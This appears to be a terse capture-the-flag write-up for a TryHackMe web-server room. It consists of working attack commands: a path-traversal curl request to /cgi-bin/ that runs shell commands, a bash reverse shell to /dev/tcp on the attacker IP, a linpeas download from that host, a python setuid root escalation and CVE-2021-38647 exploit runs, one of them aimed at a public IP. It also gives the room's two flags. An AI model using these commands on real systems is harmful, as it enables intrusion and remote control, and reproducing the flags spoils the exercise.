# Oh_my_webserver 

> VOiD | Saturday 05 March 2022 05:19:34 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.191.227


## PORT 80 [http]
```bash
DS_Store
DS_Store: Apple Desktop Services Store


https://w-e-b.site/?act=dsstore
Extract content from .DS_Store format files
Count:  9
css
fonts
images
images
images
images
js
js
js


curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "10.10.191.227/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'" "10.10.191.227/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


```

## USER [daemon - container[docker]]
```bash
curl http://10.8.253.221/linpeas.sh -o lin.sh


Current capabilities:
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i


/usr/bin/python3.7 = cap_setuid+ep

/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

root@4a70924bafa0:/root# cat user.txt 
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}

```

## USER [root - container[docker]]
```bash
root@4a70924bafa0:/tmp# ./nmap 172.17.0.2/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-06 17:39 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.024s latency).
Not shown: 1205 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:8A:9C:1A:D3 (Unknown)

Nmap scan report for 4a70924bafa0 (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
80/tcp open  http

## Al port scan 172.17.0.1
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown


python CVE-2021-38647.py -t 40.87.92.228 -p 5986 -c id
python3 exp.py -t 172.17.0.1 -p 5986 -c id

python3 exp.py -t 172.17.0.1 -p 5986 -c id


root@ubuntu:/root# cat root.txt 
THM{7f147ef1f36da9ae29529890a1b6011f}

```
